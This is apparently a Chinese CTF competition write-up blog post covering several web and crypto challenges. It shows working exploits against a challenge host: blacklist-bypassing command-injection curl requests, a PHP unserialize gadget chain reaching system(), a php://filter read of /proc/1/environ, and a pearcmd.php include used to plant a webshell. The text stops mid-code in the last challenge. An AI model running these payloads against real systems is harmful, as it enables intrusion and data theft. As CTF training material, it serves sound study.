        <content type="html"><![CDATA[<h3 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$inputNumber</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\d/'</span><span class="token punctuation">,</span> <span class="token variable">$inputNumber</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"不行不行,不能这样"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$inputNumber</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"OK,接下来你知道该怎么做吗"</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\'|\"|id/i'</span><span class="token punctuation">,</span>                <span class="token variable">$cmd</span>            <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"你传的参数似乎挺正经的,放你过去吧&lt;br&gt;"</span><span class="token punctuation">;</span>                <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono,hacker!!!"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">curl -X POST 'http://27.25.151.198:45344/?Number[]=a' \  -d 'cmd=a=l;b=s$IFS/;$a$b'     or   cmd=a=l;b=s;$a$b /;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/50884168adea19e59625063d7c5a4a9a.png"></p><pre class="line-numbers language-none"><code class="language-none">curl -X POST 'http://27.25.151.198:45344/?Number[]=a' \  -d 'cmd=a=ca;b=t;c=se;d=d;e=di;f=r;$a$b /$($e$f -1 / | $c$d -n 5p);'     cmd=a=l;b=s;$a$b /;c=s;d=ed;e=ca;f=t;$e$f /$($a$b / | $c$d -n 5p);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/302de738747df8ca3cd597abb34f680a.png"></p><blockquote><ul><li><code>dir -1</code>：和 <code>ls -1</code> 功能一样，会把目录中的内容按<strong>每行一个文件</strong>的形式列出来，并且<strong>默认按照字母顺序排序</strong>。</li><li><code>sed -n 5p</code>：从输出结果里提取<strong>第五行</strong>，也就是第五个文件的名字。</li><li>Sed 支持一下几种地址类型：<br>1、 first<del>step<br>这两个单词的意思： first 指起始匹配行， step 指步长，例如： sed -n 2</del>5p 含义：从第二行开始匹配，隔 5 行匹配一次，即 2,7,12…….。</li><li><code>cat /$(...)</code><ul><li><code>$(...)</code>：这是命令替换的语法，会先执行括号里的子命令，然后把执行结果替换到原命令中。</li><li><code>cat /&lt;文件名&gt;</code>：读取根目录下对应文件的内容。</li></ul></li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/da4d38d1e0ce4e0752bc4444e60b68d3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5994d10d3ab873da81790e22a678bb9d.png"></p><hr><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p><a href="https://xz.aliyun.com/news/11289">浅析PHP GC垃圾回收机制及常见利用方式-先知社区</a></p><blockquote><p><code>[0 =&gt; $name]</code>：</p><ul><li><p><code>0</code> 是数组的<strong>数字键</strong>（索引）。</p></li><li><p><code>$name</code> 是变量，作为数组对应键 <code>0</code> 的值。</p></li><li><p>等价于传统写法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GOGOGO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$dengchao</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//echo "Go Go Go~ 出发喽！";</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Go Go Go~ 出发喽！"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dengchao</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DouBao</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$dao</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Dagongren</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Bagongren</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Dagongren</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Bagongren</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Dagongren</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Bagongren</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Dagongren</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Bagongren</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//echo "诗人我吃！";</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dao</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'诗人我吃！'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HeiCaFei</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$HongCaFei</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//echo "Hongkafei";</span>        <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">HongCaFei</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">=&gt;</span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//echo "What do you want to do?";</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'What do you want to do?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//异常抛出,GC中的PHP反序列化时,demo已经给出了方法，即先传值给数组，而后将第二个索引置空即可</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$param_arr</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>$callback</code>：要调用的回调函数（如函数名、类方法、闭包等）。</p></li><li><p><code>$param_arr</code>：传递给回调函数的参数数组。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 示例1：调用普通函数</span><span class="token keyword">function</span> <span class="token function-definition function">sum</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sum'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：30</span>  <span class="token comment">// 示例2：调用类方法</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Math</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">multiply</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">*</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Math'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'multiply'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出：30</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GOGOGO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$dengchao</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DouBao</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$dao</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Dagongren</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Bagongren</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HeiCaFei</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$HongCaFei</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GOGOGO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DouBao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HeiCaFei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">dengchao</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">dao</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$payload</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:4:"ls /";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:0;}}}i:1;i:0;}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在PHP的<code>call_user_func_array()</code>中，回调函数的格式有严格要求：</p><pre class="line-numbers language-none"><code class="language-none">call_user_func_array(callable $callback, array $args)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当<code>$callback</code>是<strong>数组形式</strong>时，PHP要求：</p><ol><li>数组第一个元素必须是<strong>对象实例</strong>（用于调用方法）</li><li>数组第二个元素必须是<strong>字符串形式的方法名</strong></li></ol><pre class="line-numbers language-none"><code class="language-none">$b-&gt;dao = [$c, "ls /"];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>$c</code> 是 <code>HeiCaFei</code> 对象实例</li><li><code>"ls /"</code> 是方法名字符串</li><li>当调用时相当于：<code>$c-&gt;{"ls /"}('诗人我吃！')</code></li><li>这会触发 <code>HeiCaFei::__call("ls /", ['诗人我吃！'])</code></li><li>最终执行：<code>call_user_func_array("system", [0 =&gt; "ls /"])</code> → <code>system("ls /")</code></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:4:"ls /";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:0;}}}i:0;i:0;}bin dev etc home lib media mnt ofl1111111111ove4g opt proc root run sbin srv sys tmp usr var data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:0;}}}i:0;i:0;}flag{615af7a8-f6e4-47e9-a3e2-d3c1f498d017} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Watch"><a href="#Watch" class="headerlink" title="Watch"></a>Watch</h3><p><a href="https://pkg.go.dev/vuln/GO-2023-2185">GO-2023-2185 - Go Packages</a></p><p>Go 1.20 filepath 漏洞（GO-2023-2185）</p><p>filepath 包无法识别带有？？\ 前缀的路径为特殊路径。在 Windows 系统中，以？？\ 开头的路径是 “根本地设备路径”，等效于以 ?\ 开头的路径 。带有？？\ 前缀的路径可用于访问系统上的任意位置。例如，路径？？\c:\x 等效于更常见的路径 c:\x 。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a621a9cc97cef74629d1cf038a3e1315.png"></p><hr><h3 id="DeceptiFlag"><a href="#DeceptiFlag" class="headerlink" title="DeceptiFlag"></a>DeceptiFlag</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0cacf819119d25da9bd92ebb0b3fefab.png"></p><p>将第二个隐藏框的display:none删了。然后第一个是xiyangyang，第二个是huitailang。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">看一下代码http<span class="token punctuation">:</span><span class="token comment">//27.25.151.198:47543/tips.php?file=php://filter/convert.base64-encode/resource=tips.php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 为 PHP 7 添加 str_starts_with 函数兼容支持</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'str_starts_with'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function-definition function">str_starts_with</span><span class="token punctuation">(</span><span class="token variable">$haystack</span><span class="token punctuation">,</span> <span class="token variable">$needle</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$haystack</span><span class="token punctuation">,</span> <span class="token variable">$needle</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'verified'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'verified'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: aicuo.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: ?file=flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\s/'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Trying to use space huh?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\./'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Trying to include files from parent directory huh?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\//'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">str_starts_with</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php://filter'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Trying to include files from root directory huh?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_starts_with</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php://filter'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$content</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$content</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'无法读取文件'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">require_once</span> <span class="token variable">$file</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http://27.25.151.198:47543/tips.php?file=php://filter/convert.base64-encode/resource=/proc/1/environflag{0d4fd8a6-5024-43de-a590-f27ca70565e3}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/011ba042a0b22b459bb607f63861bdfd.png"></p><p>or</p><p>发现不能⽤php伪协议，也不能直接 / 开头和⽤ ../  ，但能⽤file协议 可以包含 pearcmd.php  来写⻢实现getshell 1 代码块 <code>/tips.php?+config-create+/&amp;file=file:///usr/local/lib/php/pearcmd&amp;/+test.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/96993855bafcb52794d39e50242a93c6.png"></p><hr><h3 id="芙宁娜的图片"><a href="#芙宁娜的图片" class="headerlink" title="芙宁娜的图片"></a>芙宁娜的图片</h3><p><a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck/OoK加密解密 - Bugku CTF平台</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e0eb9c2c67ed5784bf182853b1f8371f.png"></p><p><a href="https://ctf.bugku.com/tool/vigenere">https://ctf.bugku.com/tool/vigenere</a></p><p>（key在图片信息中）</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f5ae16ca942a20d4d660e685b34033ba.png"></p><hr><h3 id="奇怪的咖啡店"><a href="#奇怪的咖啡店" class="headerlink" title="奇怪的咖啡店"></a>奇怪的咖啡店</h3><p><a href="https://xz.aliyun.com/news/12518">浅谈Python原型链污染及利用方式-先知社区</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template<span class="token keyword">import</span> json<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token 